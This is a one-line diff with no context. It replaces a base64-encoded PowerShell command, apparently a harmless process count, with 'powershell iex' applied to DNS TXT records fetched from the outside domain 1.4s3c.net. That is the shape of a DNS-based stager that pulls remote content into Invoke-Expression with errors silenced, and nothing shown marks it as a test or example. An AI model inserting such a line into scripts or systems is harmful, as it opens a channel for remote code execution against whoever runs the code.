@@ -1,1 +1,1 @@
-[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('KABHAGUAdAAtAFAAcgBvAGMAZQBzAHMAKQAuAGMAbwB1AG4AdAA='))
+powershell iex '($c=(Resolve-DnsName 1.4s3c.net -Type TXT -EA SilentlyContinue).strings -join \"\")'
